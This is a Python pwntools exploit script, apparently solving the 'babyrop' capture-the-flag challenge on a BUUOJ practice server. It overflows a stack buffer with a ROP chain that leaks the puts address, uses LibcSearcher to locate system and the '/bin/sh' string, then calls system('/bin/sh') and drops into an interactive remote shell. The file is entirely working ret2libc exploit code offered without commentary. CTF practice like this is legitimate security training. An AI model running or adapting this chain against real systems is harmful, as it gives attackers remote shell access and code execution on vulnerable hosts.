from pwn import *
from LibcSearcher import *
context.arch='amd64'

# p = process('./babyrop')
p = remote('node3.buuoj.cn',27480)
elf = ELF('./babyrop',checksec=False)

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']
pop_rdi = 0x0000000000400733 # pop rdi ; ret

payload = 'A'*(0x20+8)
payload += flat([pop_rdi, puts_got, puts_plt, main])
p.recvuntil("Pull up your sword and tell me u story!\n")
p.send(payload)

puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success('puts_addr = %#x',puts_addr)

libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

payload = 'A'*(0x20+8)
payload += flat([pop_rdi, binsh, system_addr, main])
p.recvuntil('story!\n')
p.send(payload)
sleep(1)
p.interactive()
